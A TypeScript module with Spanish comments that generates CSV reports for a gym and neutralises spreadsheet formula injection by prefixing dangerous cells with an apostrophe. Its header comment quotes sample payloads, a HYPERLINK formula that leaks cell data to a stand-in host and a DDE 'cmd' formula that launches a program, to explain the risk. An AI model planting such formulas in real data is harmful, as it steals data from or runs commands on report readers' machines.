/**
 * Generación de CSV con defensa contra **inyección de fórmulas**
 * (barandilla §5.5 de la especificación).
 *
 * El riesgo: Excel y Google Sheets evalúan como fórmula cualquier celda que
 * empiece con `=`, `+`, `-`, `@` o un control de tabulación/retorno. Un cliente
 * registrado como `=HYPERLINK("http://malo/?"&A1)` o con `=cmd|'/c calc'!A1`
 * se ejecuta en la máquina de quien abre el reporte. El dato entra por un
 * formulario del gimnasio, así que hay que sanear a la SALIDA.
 *
 * La defensa: anteponer un apóstrofo a las celdas peligrosas — la hoja lo trata
 * como texto y no muestra el apóstrofo — además del entrecomillado normal de
 * CSV (comillas, comas y saltos de línea).
 */

const DANGEROUS = /^[=+\-@\t\r]/;

export function sanitizeCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const s = String(value);
  return DANGEROUS.test(s) ? `'${s}` : s;
}

function quote(s: string): string {
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export type Column<T> = {
  header: string;
  /** Valor de la celda. Los números se dejan crudos para que Excel los sume. */
  value: (row: T) => string | number | null | undefined;
};

export function toCsv<T>(rows: T[], columns: Column<T>[]): string {
  const head = columns.map((c) => quote(sanitizeCell(c.header))).join(",");
  const body = rows.map((r) =>
    columns
      .map((c) => {
        const v = c.value(r);
        // Los números no pueden acarrear fórmulas: van tal cual.
        return typeof v === "number"
          ? String(v)
          : quote(sanitizeCell(v));
      })
      .join(","),
  );

  // BOM UTF-8: sin él, Excel en Windows abre los acentos como mojibake.
  return `﻿${[head, ...body].join("\r\n")}\r\n`;
}
